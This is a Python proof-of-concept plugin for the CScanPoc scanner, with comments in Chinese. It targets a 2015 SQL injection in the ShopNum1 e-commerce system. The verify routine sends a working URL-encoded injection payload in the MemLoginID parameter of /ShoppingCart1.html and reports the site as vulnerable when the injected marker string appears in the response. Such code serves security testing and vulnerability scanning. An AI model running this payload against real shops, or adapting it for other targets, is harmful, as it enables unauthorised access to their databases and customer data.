# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'ShopNum1_0008'  # 平台漏洞编号，留空
    name = '武汉群翔软件有限公司商城系统注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-12'  # 漏洞公布时间
    desc = '''
        ShopNum1网店系统是武汉群翔软件有限公司自主研发的基于 WEB 应用的 B/S 架构的B2C网上商店系统，主要面向中高端客户， 为企业和大中型网商打造优秀的电子商务平台，ShopNum1运行于微软公司的 .NET 平台，采用最新的 ASP.NET 3.5技术进行分层开发。拥有更强的安全性、稳定性、易用性。
        武汉群翔软件有限公司商城系统/ShoppingCart1.html文件设计缺陷导致注入漏洞的产生。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0118447'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ShopNum1'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '88d5953f-f487-48cf-9dea-dceff86b074e'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            arg = '{target}'.format(target=self.target)
            payload = "/ShoppingCart1.html?MemLoginID=200200%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"
            url = arg+payload
            code, head, res, errcode, finalurl = hh.http(url)
            if code == 200 and "testXQ17" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
